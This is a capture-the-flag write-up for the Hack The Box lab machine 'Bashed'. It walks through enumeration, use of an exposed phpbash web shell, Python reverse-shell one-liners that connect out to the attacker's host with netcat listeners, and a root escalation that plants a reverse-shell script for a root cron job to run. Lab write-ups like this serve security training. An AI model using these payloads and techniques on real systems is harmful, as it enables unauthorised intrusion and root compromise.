# Machine : Bashed - HTB Labs

## Enumeration

### Nmap

```bash
nmap -sV -sC 10.10.10.68
```

Only port 80 is open — **Apache**.

---

### Directory Fuzzing

`ffuf` directory fuzzing with a SecLists wordlist reveals `/dev`.

Navigate to:

```
10.129.80.176:80/dev
```

A file is found: **`phpbash`** — a web shell.

---

## Initial Access

### Reverse Shell

Trigger a Python reverse shell via `phpbash`:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.230",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Open a listener on Kali:

```bash
nc -lnvp 1235
```

### PTY Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

→ reverse shell obtained.

> **Note:** There is a reverse shell command that combines the connection and the PTY upgrade in a single step:
> ```python
> python -c 'import pty,os,socket;s=socket.socket();s.connect(("10.10.15.230",1235));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
> ```
> However, it is generally preferable to use a standalone reverse shell command, then upgrade the PTY afterward, so a failed upgrade does not take down the connection.

---

## Privilege Escalation

### Root

Check which users can be switched to without a password:

```bash
sudo -l
```

Switch to the `scriptmanager` user:

```bash
sudo -u scriptmanager /bin/bash
```

Check directories on the system to see whether `scriptmanager` has write access to any of them:

```bash
ls -ld /
```

Inspect the contents of a directory `scriptmanager` controls:

```bash
ls -ld /scripts
```

```bash
cat test.py
```

```bash
cat test.txt
```

From the Python code's output and the content of `test.txt`, it's clear that `test.txt` was created by the `test.py` script.

Since `scriptmanager` is the only user with access to and control over `script.py`, and did not run it themselves just now, `root` is likely executing it via a **cron job**.

**Verifying the hypothesis:** delete `test.txt` and wait a bit — after one minute the file is recreated, confirming the hypothesis.

```bash
ls
# test.txt  test.py

rm -f test.txt

date
# Sun Oct 25 13:03:09 PDT 2026

ls
# test.py

date
# Sun Oct 25 13:05:04 PDT 2026

ls
# test.txt  test.py
```

---

### Privilege Escalation via Reverse Shell

Since the file is executed by `root`, create a reverse shell script in the current directory. After one minute it gets executed, giving us root.

> **Note:** Do not use an exploit filename starting with a dot, as the cron job will not see it.

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.230\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > exploit.py
```

```bash
nc -lnvp 31337
```

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Step to confirm this is indeed cron-related:**

```bash
crontab -l
```

**Grab the flag:**

```bash
cat /root/root.txt
```